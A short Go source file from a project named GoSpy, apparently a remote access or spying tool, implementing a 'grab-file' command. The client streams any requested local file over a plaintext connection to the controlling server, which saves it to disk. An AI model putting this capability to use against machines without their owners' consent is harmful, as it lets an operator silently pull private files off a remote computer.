package commands

import (
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/server/conman"
	"io"
	"os"
)

// GrabFileReply sends the selected file over the network to the server. Always uses plaintext connection.
func GrabFileReply(c comms.Connection, localFilePath string) error {
	// The new connection is created first so if the client or server has a file open/r/w err the connection is closed
	// which signifies to the other process to not continue with the command. (same with GrabFileSend).
	fileTransferCon, err := comms.DupeCon(c)
	if err != nil {
		return err
	}
	defer fileTransferCon.Close()

	fd, err := os.Open(localFilePath)
	if err != nil {
		return err
	}
	defer fd.Close()

	if _, err = io.Copy(fileTransferCon, fd); err != nil {
		return err
	}

	return nil
}

// GrabFileSend requests a file on the client at src and writes it to dst on the current machine. Always uses plaintext
// connection.
func GrabFileSend(man conman.ConMan, src, dst string) (err error) {
	fullCommand := fmt.Sprintf("grab-file %s", src)
	if err = man.CmdCon.SendBytes([]byte(fullCommand)); err != nil {
		return err
	}

	fileTransferCon := man.WaitForNewConnection()
	defer fileTransferCon.Close()

	fd, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer fd.Close()

	err = <-comms.CopyFromConnection(fileTransferCon, fd)

	if err == io.EOF {
		fmt.Println("File copy complete")
	} else {
		fmt.Printf("File copy error: %s", err.Error())
	}

	// Only return errors with man.CmdCon.
	return nil
}
